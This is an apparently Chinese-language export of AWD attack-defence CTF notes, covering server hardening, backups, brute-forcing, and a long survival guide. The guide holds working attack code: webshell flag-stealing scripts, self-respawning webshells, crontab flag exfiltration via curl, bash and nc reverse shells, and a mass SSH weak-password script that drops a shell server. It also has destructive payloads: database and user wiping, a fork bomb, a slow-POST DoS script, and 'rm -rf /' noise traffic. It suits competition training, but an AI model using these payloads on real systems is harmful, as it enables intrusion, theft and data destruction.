192.168.0.2 #扫描主机全部端口 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/信息修改.html":{"url":"3.网络安全/AWD/信息修改.html","title":"信息修改","keywords":"","body":"1、修改密码 SSH口令 #ssh修改 passwd 数据库密码修改（记得同步修改网站数据库配置） 1.登录：mysql -u root -p password 2.选择数据库：use mysql; 3.更改密码：set password for '用户名'@'localhost' = password('4f31b4qscWEmc71NJJU'); 4.刷新权限：flush privileges; exit; 或 mysqladmin -u user -p 123456 password 4f31b4qscWEmc71NJJU 2、关闭 MySQL 远程登录（有些比赛会检查这个的check，建议慎用） mysql -u root -p mysql> use mysql; mysql> update user set host = 'localhost' where user='root' and host='%'; mysql> flush privileges; mysql> exit; WEB服务口令(后台密码) 配置文件方式的后台密码 find /var/www/html -path 'config' #查找配置文件中的密码凭证 数据库后台管理员密码 mysql -u root -p show databases; use dataname; show tables; select * from admin; updata admin set user pass=’4f31b4qscWEmc71NJJU’; //updata 表名 set 字段名 = ‘值’; flush privileges; 账号用户检查 SSH 检查/etc/passwd文件：是否有/bin/bash的用户 cut -d : -f 1 /etc/passwd cat /etc/shadow 使用usermod命令禁用可疑用户： usermod -L 用户名 删除 userdel -r 用户名 MYSQL 删除多余的账号 登录MySQL数据库 mysql -u root -p password 查询所有用户： SELECT DISTINCT CONCAT('User: ''', user, '''@''', host, ''';') AS query FROM mysql.user; 1 删除用户： DROP USER user1, user2, user3; 确保将user1, user2, user3替换为实际的用户名列表。 刷新权限： FLUSH PRIVILEGES; 2.dump源码（方便应急响应恢复靶机） 网站源码备份 使用ssh工具保留源码，复制两份，用d盾去扫一份 防止在对源码进行修改时出问题，或者被攻击方删除源码而准备 压缩源码： tar -cvf web.tar /var/www/html zip -q -r web.zip /var/www/html 解压缩源码： tar -xvf web.tar -c /var/www/html unzip web.zip -d /var/www/html 备份源码： mv web.tar /tmp mv web.zip /home/xxx 上传和下载源码： scp username@ip:/path/filename /tmp/local_destination //从服务器下载单个文件到本地 scp /path/local_filename username@ip:/path //从本地上传单个文件到服务器 scp -r username@ip:remote_dir/ /tmp/local_dir //从服务器下载整个目录到本地 scp -r /tmp/local_dir username@ip:remote_dir //从本地上传整个目录到服务器 数据备份 php网站数据库配置信息为 config.php/web.conf php.ini文件、postgresql.conf、settings.py、mongod.conf、web.config 备份指定数据库 mysqldump –u username –p password databasename > bak.sql 备份所有数据库 mysqldump –all -databases > bak.sql 导入数据库 mysql – u username – p password database 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/加固.html":{"url":"3.网络安全/AWD/加固.html","title":"加固","keywords":"","body":"慢Dos攻击修复（slowhttptest） Apache: httpd.conf下启用mod_reqtimeout模块 去掉LoadModule reqtimeout_module modules/mod_reqtimeout.so前面的#号 增加以下配置： RequestReadTimeout header=5-40,MinRate=500 body=20,MinRate=500 重启apache，工具扫描确认漏洞是否修改完成。 Nginx: 关闭慢速连接 server { client_body_timeout 5s; #NGINX在客户机体写入之间等待的时间 client_header_timeout 5s; #NGINX在写入客户机标题之间等待的时间 limit_conn perserver 300;#限制当前站点最大并发数 limit_conn perip 25;#限制单个IP访问最大并发数 limit_rate 512k;#限制每个请求的流量上限（单位：KB） # ... } 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/定时备份源码.html":{"url":"3.网络安全/AWD/定时备份源码.html","title":"定时备份源码","keywords":"","body":"#!/bin/bash while [ 1 ] do time=`/bin/date +%H-%M-%S` bak_file=\"/var/www/$time.tar.gz\" webdir=\"/var/www/html\" tar zcvf $bak_file $webdir >/dev/null 2>&1 & # 每个一分钟备份 sleep 60 done 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/弱口令爆破.html":{"url":"3.网络安全/AWD/弱口令爆破.html","title":"弱口令爆破","keywords":"","body":"爆破SSH密码 hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ssh hydra -L 用户名字典.txt -P 密码字典.txt ssh://192.168.1.100 hydra -L 用户名字典.txt -P 密码字典.txt ssh://192.168.1.100 -s 40 //40是⽬标服务开放的端⼝ 爆破FTP密码 hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ftp hydra -L 用户名字典.txt -P 密码字典.txt ftp://192.168.1.100/ 爆破RDP远程桌面密码 hydra 目标IP地址 rdp -l administrator -P 密码字典.txt -V 爆破Telnet hydra 目标IP地址 telnet -l 用户字典.txt -P 密码字典.txt -f -V 爆破MSSQL数据库 hydra -l sa -P 密码字典.txt 目标IP地址 mssql 爆破MySQL数据库 hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 mysql 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/数据库信息修改.html":{"url":"3.网络安全/AWD/数据库信息修改.html","title":"数据库信息修改","keywords":"","body":"数据库密码修改 mysql -u root -p Show databases; use mysql; set password for root@localhost = password('d1fd2i64m527bd4B'); 或者 update user set password = PASSWORD('d1fd2i64m527bd4B') where user = 'root'; flush privileges; show tables; # 可能有flag。 select * from typecho_flag; 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/服务配置文件探测.html":{"url":"3.网络安全/AWD/服务配置文件探测.html","title":"服务配置文件探测","keywords":"","body":"应用发现 apaech2.conf是主配置文件，不是真正的具体配置文件，它只是把各 个零散的配置文件以inluceding方式包含进来，如下图所示： 组件发现： find / -name \"nginx.conf\" #定位nginx目录 find / -path \"*nginx*\" -name nginx*conf #定位nginx配置目录 find / -name \"httpd.conf\" #定位apache目录 find / -path \"*apache*\" -name apache*conf #定位apache配置目录 网站发现： find / -name \"index.php\" #定位网站目录 日志发现： /var/log/nginx/ #默认Nginx日志目录 /var/log/apache/ #默认Apache日志目录 /var/log/apache2/ #默认Apache日志目录 /usr/local/tomcat/logs #Tomcat日志目录 tail -f xxx.log #实时刷新滚动日志文件 以上是定位常见文件目录的命令或方法，比赛需要根据实际情况类推，善用find命令！ 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/浅谈AWD攻防赛的生存攻略.html":{"url":"3.网络安全/AWD/浅谈AWD攻防赛的生存攻略.html","title":"浅谈AWD攻防赛的生存攻略","keywords":"","body":"浅谈AWD攻防赛的生存攻略 AWD 规则 AWD：Attack With Defence，即攻防对抗，比赛中每个队伍维护多台服务器（一般两三台，视小组参赛人数而定），服务器中存在多个漏洞（web层、系统层、中间件层等），利用漏洞攻击其他队伍可以进行得分，加固时间段可自行发现漏洞对服务器进行加固，避免被其他队伍攻击失分。 1.一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）； 2.可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析（较少提供）； 3.flag在主办方的设定下每隔一定时间刷新一轮； 4.各队一般都有一个初始分数； 5.flag一旦被其他队伍拿走，该队扣除一定积分； 6.得到flag的队伍加分； 7.一般每个队伍会给一个低权限用户，非root权限； 8.主办方会对每个队伍的服务进行check，服务器宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分。 # 前期准备 ## SSH登录 口令登录 命令格式为： ssh 客户端用户名@服务器ip地址 ssh 用户名@ip ssh ctf@192.168.182.130 如果不是默认的22端口，也可以使用 -p 选项来修改端口号，比如连接到服务器的2222端口 ssh -p 指定端口号 用户名@ip ssh -p 2222 ctf@192.168.182.130 除此之外还可以使用Finalshell或者Xshell等图形化服务器管理软件 密钥登录 用id_rsa用于登陆靶机，命令如下 sftp -i id_rsa ctf@192.168.182.130 改密码 官方在给出服务器密码时，很有可能是默认的，那就需要赶快修改自己的密码，但一般主办方给的是随机密码。 如果发现每个队伍的SSH账号密码都是一样的，需要立即修改口令，如果被其他队伍改了那就gg了，同时要准备好批量脚本，一旦是默认密码，可以直接利用。 SSH密码修改: passwd mysql密码修改: #方法一 show databases; use mysql set password for root@localhost = password('123'); #方法二 update user set password = PASSWORD('需要更换的密码') where user='root'; flush privileges; show tables; Web后台很有可能存在弱口令，需要立即修改，也可以修改其他队伍的后台口令，为本队所用，说不定可以利用后台getshell。 备份源码 比赛开始后第一时间备份服务器中web目录下的文件(/var/www/html)，备份的目的在于万一对方利用漏洞进入你的靶机将你的WWW下的目录给删除了，可以及时恢复，如果你没有备份就相当于宕机了 比赛开始第一时间备份，备份网站目录及数据库，一般在 /var/www/html 目录。 1.目录打包 打包 tar -zcvf archive_name.tar.gz directory_to_compress 注意：如果使用tar命令打包文件夹，.index.php（隐藏类型文件）将不会被打包 备份整站 cd /var/www && tar -czvf /tmp/html.tgz html # 软连接到了/app cd / && tar -czvf /tmp/app.tgz app 解包 tar -zxvf archive_name.tar.gz 2.备份数据库 备份指定的多个数据库 mysqldump -uroot -proot --databases DB1 DB2 > /tmp/db.sql 无 lock tables 权限的解决方法 mysqldump -uroot -proot --all-databases --skip-lock-tables > /tmp/db.sql 恢复备份（在 MySQL 终端下执行） source FILE_PATH 重置 MySQL 密码（在 MySQL 终端下执行） 方法 1 set password for 用户名@localhost = password(\"新密码\") 方法 2 mysqladmin -u用户名 -p旧密码 password 新密码 3.下载到本地 scp -P ssh_port user@host_ip:/tmp/bak.sql local_file 查找预留后门 用D盾扫描备份的文件，查找预留后门，第一时间删除自己靶机上的后门，也可以利用后门攻击其他靶机。 可以使用 seay进行代码审计 端口扫描 端口扫描是信息收集的一部分，需要知道目标服务器开放了哪些端口，使用端口扫描工具有御剑高速TCP全端口扫描工具、nmap和masscan等进行扫描。 所有服务器配置都是一样的，也可以看己方靶机开放了哪些端口。 以下是一些服务端口的漏洞： 22：ssh弱口令 873：未授权访问漏洞 3306：mysql弱口令 6379：redis未授权访问漏洞 攻击思路 主机发现 信息收集 nmap、Routescan Python 脚本 import requests for x in range(2,255): url = \"http://192.168.1.{}\".format(x) try: r = requests.post(url) print(url) except: pass 后门利用 curl读flag C:\\Users\\admin>curl \"http://192.168.182.130:8801/include/shell.php\" -d \"admin_ccmd=system('cat /f*');\" SL{4a0be463dd85555090f2216795677916d2447242} flag{glzjin_wants_a_girl_friend} 脚本 端口 #coding=utf-8 import requests url_head=\"http://192.168.182.130\" #网段 url=\"\" shell_addr=\"/upload/url/shell.php\" #木马路径 passwd=\"pass\" #木马密码 #port=\"80\" payload = {passwd: 'System(\\'cat /flag\\');'} # find / -name \"flag*\" #清空上次记录 flag=open(\"flag.txt\",\"w\") flag.close() flag=open(\"flag.txt\",\"a\") for i in range(8000,8004): url=url_head+\":\"+str(i)+shell_addr try: res=requests.post(url,payload)#,timeout=1 if res.status_code == requests.codes.ok: result = res.text print (result) flag.write(result+\"\\n\") else: print (\"shell 404\") except: print (url+\" connect shell fail\") flag.close() 一句话木马 常用语言的一句话木马 php： aspx： 蚁剑连接get型木马，之前一直不会用蚁剑连接get型木马，这里记录一下。 隐藏shell shell很容易被发现，被删除就gg了，可以采用一些操作隐藏shell或使shell无法被删除 1.把shell.php命名为.shell.php .shell.php在执行ls时无法被查看到，搭配ls的参数才能被发现 完整命令如下 [sss@ecs-centos-7 awd]$ echo \"iamshell\">shell.php [sss@ecs-centos-7 awd]$ ls shell.php [sss@ecs-centos-7 awd]$ mv shell.php .shell.php [sss@ecs-centos-7 awd]$ ls [sss@ecs-centos-7 awd]$ ls -al 总用量 12 drwxrwxr-x 2 sss sss 4096 12月 29 22:52 . drwx------ 4 sss sss 4096 12月 29 22:51 .. -rw-rw-r-- 1 sss sss 9 12月 29 22:52 .shell.php 2.把shell.php命名为-shell.php 从上面可以看出，ls加参数才能查看到shell，那么我们直接写一个-shell.php、 命令行会把-后面的内容当成参数执行，执行即使被发现，使用rm命令进行删除，会被当成是rm的参数，就会发生报错，无法删除shell，目的也达到了 完整命令如下 [sss@ecs-centos-7 awd]$ ls -shell.php [sss@ecs-centos-7 awd]$ rm -shell.php rm：无效选项 -- s Try 'rm ./-shell.php' to remove the file \"-shell.php\". Try 'rm --help' for more information. [sss@ecs-centos-7 awd]$ rm -rf -shell.php rm：无效选项 -- s Try 'rm ./-shell.php' to remove the file \"-shell.php\". Try 'rm --help' for more information. 特殊的shell shell1： 连接方式：php?2=assert密码是1。 shell2： 配置为?b=))99(rhC(tseuqeR+lave shell3： 配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs= 连接密码:0（零） shell4：MD5木马 shell5：MD5木马+利用header 2021ISCC河南赛区线下赛就是这种shell，当时差点没看出来 不死马 不死马示例： '; while (1){ file_put_contents($file,$code); system('touch -m -d \"2018-12-01 09:10:12\" shell2.php'); usleep(5000); } ?> #passwd=y0range857 #POST传参：passwd=y0range857&a=system('ls'); 将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件，然后使用caidao输入http://xxx/shell2.php?pass=pass的路径，密码为a就可以链接一句话，由于pass是md5加密很难被破解也可以做到隐蔽,md5值可以随意定义。 写入shell， at.php内容 '; while (1){ file_put_contents($file,$code); system('touch -m -d \"2018-12-01 09:10:12\" .login.php'); file_put_contents($file1,$code); system('touch -m -d \"2018-12-01 09:10:12\" /admin/.register.php'); usleep(5000); } ?> 浏览器访问at.php，会生成不死马at2.php url/upload/at.php 再传入，执行命令，getshell url/upload/at2.php?passwd=obse007&at=system('ls'); 权限维持 预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少，未雨绸缪。 crontab定时任务 1.使用定时任务写马 system('echo \"* * * * * echo \\\" /var/www/html/.index.php\\n* * * * * chmod 777 /var/www/html/.index.php\" | crontab;whoami'); 密码：atkx 来指定用户运行指定的定时任务 2.使用定时任务发送带有flag的请求 bash# 编辑 crontab：crontab -e */5 * * * * curl 10.10.10.5:8000/submit_flag/ -d 'flag='$(cat /home/web/flag/flag)'&token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY' # 查询 crontab：crontab -l 3.使用定时任务反弹shell bash -c bash'bash -i >& /dev/tcp/[ip]/[port] 0>&1' nc -e /bin/bash 1.3.3.7 4444 bash 反弹shell nc反弹shell bash -i >& /dev/tcp/192.168.182.130/6666 0>&1 本地 nc -l -p 6666 软链接 软连接语法： ln -s [shell路径] [新文件路径] 使用方法： 访问/upload/new.php，实际上是访问/upload/shell.php ln -s /var/www/html/upload/shell.php /var/www/html/upload/new.php 软连接利用 root@086f12c38b93:~# ln -s /flag /var/www/html/css/flag.css root@086f12c38b93:~# cat /var/www/html/css/flag.css SL{3c7c719b9fb980dca71080b9d96c9c6aa03c16c0} 然后访问url/css/flag.css即可得到flag SSH弱密码利用 #-*- coding:utf-8 -*- import paramiko ip = '192.168.1.137' port = '22' username = 'root' passwd = '123456' # ssh 用户名 密码 登陆 def ssh_base_pwd(ip,port,username,passwd,cmd='cat /flag'): port = int(port) ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(hostname=ip, port=port, username=username, password=passwd) stdin,stdout,stderr = ssh.exec_command(cmd) result = stdout.read() if not result : print(\"无结果!\") result = stderr.read() ssh.close() return result.decode() a = ssh_base_pwd(ip,port,username,passwd) print(a) #SL{3c7c719b9fb980dca71080b9d96c9c6aa03c16c0} 批量 #-*- coding:utf-8 -*- import paramiko import threading import queue import time #反弹shell python q=queue.Queue() #lock = threading.Lock() # ssh 用户名 密码 登陆 def ssh_base_pwd(ip,port,username,passwd,cmd): port = int(port) ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(hostname=ip, port=port, username=username, password=passwd) stdin,stdout,stderr = ssh.exec_command(cmd) result = stdout.read() if not result : result = stderr.read() ssh.close() return result.decode() def main(x): shell = ''' #服务器端 import socket import os s=socket.socket() #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.bind(('0.0.0.0',1234)) #绑定地址和端口#0.0.0.0接收任意客户端ip连接 s.listen(5) #调用listen方法开始监听端口，传入的参数为等待连接的最大数量 con,addr=s.accept() #接受一个客户端的连接 #print(con,addr) for i in range(10): cmd=con.recv(1024) print(cmd) command=cmd.decode() if command.startswith('cd'): os.chdir(command[2:].strip()) #切换路径 result=os.getcwd() #显示路径 else: result=os.popen(command).read() if result: con.send(result.encode()) else: con.send(b'OK!') ''' cmd = 'echo \\\"%s\\\" > ./shell.py' % (shell) +'&& python3 ./shell.py' port = '22' username = 'root' passwd = 'toor' ip = '192.168.1.{}'.format(x) q.put(ip.strip(),block=True, timeout=None) ip_demo=q.get() #判断是否成功 try: #lock.acquire() res = ssh_base_pwd(ip_demo,port,username,passwd,cmd='id') if res: print(\"[ + ]Ip: %s\" % ip_demo +\" is success!!! [ + ]\") #lock.release() ssh_base_pwd(ip_demo,port,username,passwd,cmd) except: print(\"[ - ]Ip: %s\" % ip_demo +\" is Failed\") if x > 255: print(\"Finshed!!!!!!!!\") q.task_done() #线程队列部分 th=[] th_num=255 for x in range(th_num): t=threading.Thread(target=main,args=(x,)) th.append(t) for x in range(th_num): th[x].start() for x in range(th_num): th[x].join() #q.join()所有任务完成 攻击搅屎 无限复制 修改数据库密码 update mysql.user set authentication_string=PASSWORD('p4rr0t');# 修改所有用户密码 flush privileges; UPDATE mysql.user SET User='aaaaaaaaaaaa' WHERE user='root'; flush privileges; delete from mysql.user ;#删除所有用户 flush privileges; 重启 apache2 和 nigix #!/usr/bin/env sh while [[ 1 ]] do service apache2 stop service nginx stop done & 循环删除 删除数据库 #!/usr/bin/env python3 import base64 def rm_db(db_user,my_db_passwd): cmd = \"/usr/bin/mysql -h localhost -u%s %s -e '\"%(db_user,my_db_passwd) db_name = ['performance_schema','mysql','flag'] for db in db_name: cmd += \"drop database %s;\"%db cmd += \"'\" return cmd fork_bomb #!/bin/sh /bin/echo '.() { .|.& } && .' > /tmp/aaa;/bin/bash /tmp/aaa; DOS脚本（非必要最好不要用） import socket import time import threading max=90000000 port=80 #端口 host=\"192.168.92.154\" #IP page=\"/index.php\" bag=(\"POST %s HTTP/1.1\\r\\n\" \"host: %s\\r\\n\" \"Content-Length: 1000000000\\r\\n\" \"Cookie: 1998\\r\\n\" \"\\r\\n\" % (page,host)) socks = [] def connect(): global socks for i in range(0,max): s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) try: s.connect((host,port)) s.send(bag.encode(\"utf-8\")) socks.append(s) except Exception as ex: time.sleep(1) def send(): global socks while True: for s in socks: try: print(\"攻击中....\") except Exception as ex: socks.remove(s) s.close() time.sleep(0.1) One = threading.Thread(target=connect,args=()) Two = threading.Thread(target=send,args=()) One.start() Two.start() 防守思路 基础查杀 寻找最近20分钟修改过的文件 find /var/www/html -name *.php -mmin -20 寻找行数最短的文件： find ./ -name '*.php' | xargs wc -l | sort -u 关键字查杀 find . -name '*.php' | xargs grep -n 'eval(' find . -name '*.php' | xargs grep -n 'assert' find . -name '*.php' | xargs grep -n 'system()' 查找命令执行函数 find /var/www/html -name \"*.php\" |xargs egrep 'assert|eval|phpinfo\\(\\)|\\(base64_decoolcode|shell_exec|passthru|file_put_contents\\(\\.\\*\\$|base64_decode\\(' 文件监控 脚本 # -*- coding: utf-8 -*- #use: python file_check.py ./ import os import hashlib import shutil import ntpath import time CWD = os.getcwd() FILE_MD5_DICT = {} # 文件MD5字典 ORIGIN_FILE_LIST = [] # 特殊文件路径字符串 Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82' bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS' logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD' webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD' difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN' Special_string = 'drops_log' # 免死金牌 UNICODE_ENCODING = \"utf-8\" INVALID_UNICODE_CHAR_FORMAT = r\"\\?%02x\" # 文件路径字典 spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str)) Special_path = { 'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)), 'log' : os.path.realpath(os.path.join(spec_base_path, logstring)), 'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)), 'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)), } def isListLike(value): return isinstance(value, (list, tuple, set)) # 获取Unicode编码 def getUnicode(value, encoding=None, noneToNull=False): if noneToNull and value is None: return NULL if isListLike(value): value = list(getUnicode(_, encoding, noneToNull) for _ in value) return value if isinstance(value, unicode): return value elif isinstance(value, basestring): while True: try: return unicode(value, encoding or UNICODE_ENCODING) except UnicodeDecodeError, ex: try: return unicode(value, UNICODE_ENCODING) except: value = value[:ex.start] + \"\".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:] else: try: return unicode(value) except UnicodeDecodeError: return unicode(str(value), errors=\"ignore\") # 目录创建 def mkdir_p(path): import errno try: os.makedirs(path) except OSError as exc: if exc.errno == errno.EEXIST and os.path.isdir(path): pass else: raise # 获取当前所有文件路径 def getfilelist(cwd): filelist = [] for root,subdirs, files in os.walk(cwd): for filepath in files: originalfile = os.path.join(root, filepath) if Special_path_str not in originalfile: filelist.append(originalfile) return filelist # 计算机文件MD5值 def calcMD5(filepath): try: with open(filepath,'rb') as f: md5obj = hashlib.md5() md5obj.update(f.read()) hash = md5obj.hexdigest() return hash except Exception, e: print u'[!] getmd5_error : ' + getUnicode(filepath) print getUnicode(e) try: ORIGIN_FILE_LIST.remove(filepath) FILE_MD5_DICT.pop(filepath, None) except KeyError, e: pass # 获取所有文件MD5 def getfilemd5dict(filelist = []): filemd5dict = {} for ori_file in filelist: if Special_path_str not in ori_file: md5 = calcMD5(os.path.realpath(ori_file)) if md5: filemd5dict[ori_file] = md5 return filemd5dict # 备份所有文件 def backup_file(filelist=[]): # if len(os.listdir(Special_path['bak'])) == 0: for filepath in filelist: if Special_path_str not in filepath: shutil.copy2(filepath, Special_path['bak']) if __name__ == '__main__': print u'---------start------------' for value in Special_path: mkdir_p(Special_path[value]) # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件 ORIGIN_FILE_LIST = getfilelist(CWD) FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST) backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG print u'[*] pre work end!' while True: file_list = getfilelist(CWD) # 移除新上传文件 diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST)) if len(diff_file_list) != 0: # import pdb;pdb.set_trace() for filepath in diff_file_list: try: f = open(filepath, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] webshell find : ' + getUnicode(filepath) shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt')) except Exception as e: print u'[!] move webshell error, \"%s\" maybe is webshell.'%getUnicode(filepath) try: f = open(os.path.join(Special_path['log'], 'log.txt'), 'a') f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\\n') f.close() except Exception as e: print u'[-] log error : file move error: ' + getUnicode(e) # 防止任意文件被修改,还原被修改文件 md5_dict = getfilemd5dict(ORIGIN_FILE_LIST) for filekey in md5_dict: if md5_dict[filekey] != FILE_MD5_DICT[filekey]: try: f = open(filekey, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] file had be change : ' + getUnicode(filekey) shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt')) shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey) except Exception as e: print u'[!] move webshell error, \"%s\" maybe is webshell.'%getUnicode(filekey) try: f = open(os.path.join(Special_path['log'], 'log.txt'), 'a') f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\\n') f.close() except Exception as e: print u'[-] log error : done_diff: ' + getUnicode(filekey) pass time.sleep(2) # print '[*] ' + getUnicode(time.ctime()) 运行 python jiankong.py /var/www/html alias起别名 alias cat=\"echo nothing\" 删除 unalias -a 对方执行cat /flag命令的时候回显就是错误flag alias cat=\"echo `date`|md5sum|cut -d ' ' -f1||\" 获取 flag 一般是 curl http://xxx.com/flag.txt alias curl='echo fuckoff' #权限要求较低，可以在这里改成虚假的flag # 或者 chmod -x curl #权限要求较高 /usr/bin curl路径 杀不死马 查看进程 root@1177499f5b23:~# ps aux | grep www-data www-data 4819 0.0 0.4 315808 9016 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 6663 0.0 0.6 316188 13460 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 6675 0.0 0.3 315620 6976 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 6690 0.0 0.4 315808 9016 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 6693 0.0 0.4 315800 9056 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 7170 0.0 0.6 316312 14100 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 7239 0.0 0.6 316172 14020 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 7526 0.0 0.4 315620 8364 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 8380 0.0 0.6 316188 12612 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 22554 0.0 0.3 315564 7416 ? S 03:10 0:00 apache2 -D FOREGROUND root 25353 0.0 0.0 8868 1544 pts/1 S+ 05:25 0:00 grep --color=auto www-data (1)杀进程 kill -9 对应的进程号 执行命令 ps aux | grep www-data | awk '{print $2}' | xargs kill -9 ps aux | grep www-data | grep -v grep | awk '{print $2}' | xargs kill -9 原理 ps aux 列出进程信息 grep www-data 在进程信息中找到需要杀死的进程 grep -v grep 在进程信息中剔除带grep的信息 awk ‘{print $2}’ 提取字符串行内容的第2个字段，也就是当前示例的进程号 xargs kill -9 将进程号作为参数传递给kill -9这个命令 然后删除不死马文件 (2)重启php等web服务，不推荐使用 service php-fpm restart (3)用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。 (4)创建一个和不死马生成的马一样名字的文件夹 mkdir 1.php 循环创建 #!/bin/bash dire=\"/var/www/html/.base.php/\" file=\"/var/www/html/.base.php\" rm -rf $file mkdir $dire ./xx.sh 清除反弹shell 查看进程 ps -ef / px -aux 出现www-data权限的/bin/sh一般为nc 然后杀进程 kill `ps -aux | grep www-data | grep apache2 | awk '{print $2}'` 提权 在AWD中，一般都需要专门防御加固自己服务器的环节，但加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般只会给一个普通权限账号，这时候往往就需要给服务器提权了。 关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。 影响范围比较大的漏洞，可以用来提权： CVE-2017-6074 (DCCP双重释放漏洞 > 2.6.18 ) ： DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务(系统崩溃)或者提升权限，获得系统的管理访问权限 CVE-2016-5195(脏牛，kernel 2.6.22 漏洞修复 基本原则 能修复的尽量修复； 不能修复的先注释源码，不影响页面显示再删除； 站点和对应的功能尽可能不宕机； 技巧 设置 waf，如 load_file； 对于一些成型的 CMS，找到相应版本号后，对其 diff； 修改弱口令用户； 对于觉得危险函数的地方直接使用die()； 比如文件上传漏洞修复，可以在upload目录下写.htaccess禁止php文件执行 Options -ExecCGI -Indexes AllowOverride None RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml php_flag engine off deny from all 一些修复技巧参考：https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/ 日志分析 命令行动态查看日志 tailf /var/log/apache2/access.log 还可以使用工具进行日志分析：LogForensics 腾讯实验室 /web日志取证分析工具 日志的存放地址 /var/log/apache2/ /usr/local/apache2/logs /usr/nginx/logs/ 为了对其他防守方进行干扰，可以利用脚本发生大量垃圾数据包，混淆视觉，给对方人员增加检测的难度，浪费对方的时间。 import requests import time def scan_attack(): file={'shell.php','admin.php','web.php','login.php','1.php','index.php'} payload={'cat /flag','ls -al','rm -f','echo 1','echo 1 /proc/sys/net/ipv4/ip_forward','rm -rf / --no-preserve-root'} while(1): for i in range(1, 50): for ii in file: url='http://192.168.182.'+ str(i)+'/'+ii print(url) for iii in payload: data={ 'payload':iii } try: requests.post(url,data=data) print(\"正在搅屎:\"+str(i)+'|'+ii+'|'+iii) time.sleep(0.1) except Exception as e: time.sleep(0.1) pass if __name__ == '__main__': scan_attack() 流量分析 在比赛服务器上抓取流量包，需要的权限比较高，一般比赛用不到 sudo tcpdump -s 0 -w flow.pcap port 80 # 然后使用 scp 写个脚本实时将流量包拷贝到本地 tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap 命令拆解分析： 1、tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型 2、-i eth1 : 只抓经过接口eth1的包 3、-t : 不显示时间戳 4、-s 0 : 抓取数据包时默认抓取长度为68字节。加上-S 0 后可以抓到完整的数据包 5、-c 100 : 只抓取100个数据包 6、dst port ! 22 : 不抓取目标端口是22的数据包 7、src net 192.168.1.0/24 : 数据包的源网络地址为192.168.1.0/24 8、-w 